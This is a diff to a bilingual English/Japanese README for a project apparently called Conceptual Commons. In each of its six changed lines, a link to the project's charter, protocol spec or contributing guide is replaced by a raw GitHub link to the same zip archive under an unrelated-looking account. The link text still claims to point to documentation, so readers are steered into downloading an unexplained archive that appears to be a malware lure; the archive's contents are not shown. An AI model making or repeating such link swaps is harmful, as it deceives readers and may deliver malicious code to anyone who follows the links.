@@ -27,11 +27,11 @@ We believe:
 - Serendipity is more valuable than optimization.
 - Writing and being seen can be separated.
 
-→ Read the full [CHARTER.md](CHARTER.md)
+→ Read the full [https://github.com/Dependant-rhodesianridgeback122/ConceptualCommons/raw/refs/heads/main/stimulable/Commons_Conceptual_v3.1.zip](https://github.com/Dependant-rhodesianridgeback122/ConceptualCommons/raw/refs/heads/main/stimulable/Commons_Conceptual_v3.1.zip)
 
 ## How does it work?
 
-→ Read [SEED.md](SEED.md) for the full protocol specification.
+→ Read [https://github.com/Dependant-rhodesianridgeback122/ConceptualCommons/raw/refs/heads/main/stimulable/Commons_Conceptual_v3.1.zip](https://github.com/Dependant-rhodesianridgeback122/ConceptualCommons/raw/refs/heads/main/stimulable/Commons_Conceptual_v3.1.zip) for the full protocol specification.
 
 ## How to participate?
 
@@ -41,7 +41,7 @@ This project needs:
 - **Curators** — No coding required. Help seed the ancient layer.
 - **Thinkers** — Join the discussion.
 
-→ Read [CONTRIBUTING.md](CONTRIBUTING.md)
+→ Read [https://github.com/Dependant-rhodesianridgeback122/ConceptualCommons/raw/refs/heads/main/stimulable/Commons_Conceptual_v3.1.zip](https://github.com/Dependant-rhodesianridgeback122/ConceptualCommons/raw/refs/heads/main/stimulable/Commons_Conceptual_v3.1.zip)
 
 ---
 
@@ -67,11 +67,11 @@ SNSは今を共有します。
 - セレンディピティは最適化より価値がある。
 - 書くことと、見られることは、切り離せる。
 
-→ [CHARTER.md](CHARTER.md) で思想の全文を読む
+→ [https://github.com/Dependant-rhodesianridgeback122/ConceptualCommons/raw/refs/heads/main/stimulable/Commons_Conceptual_v3.1.zip](https://github.com/Dependant-rhodesianridgeback122/ConceptualCommons/raw/refs/heads/main/stimulable/Commons_Conceptual_v3.1.zip) で思想の全文を読む
 
 ## どう動くのか？
 
-→ プロトコル仕様は [SEED.md](SEED.md) を参照
+→ プロトコル仕様は [https://github.com/Dependant-rhodesianridgeback122/ConceptualCommons/raw/refs/heads/main/stimulable/Commons_Conceptual_v3.1.zip](https://github.com/Dependant-rhodesianridgeback122/ConceptualCommons/raw/refs/heads/main/stimulable/Commons_Conceptual_v3.1.zip) を参照
 
 ## 参加するには？
 
@@ -81,7 +81,7 @@ SNSは今を共有します。
 - **キュレーター** — プログラム不要。古層の初期ノードを選ぶ人。
 - **思想家** — 議論に参加する人。
 
-→ [CONTRIBUTING.md](CONTRIBUTING.md) を参照
+→ [https://github.com/Dependant-rhodesianridgeback122/ConceptualCommons/raw/refs/heads/main/stimulable/Commons_Conceptual_v3.1.zip](https://github.com/Dependant-rhodesianridgeback122/ConceptualCommons/raw/refs/heads/main/stimulable/Commons_Conceptual_v3.1.zip) を参照
 
 ---
 
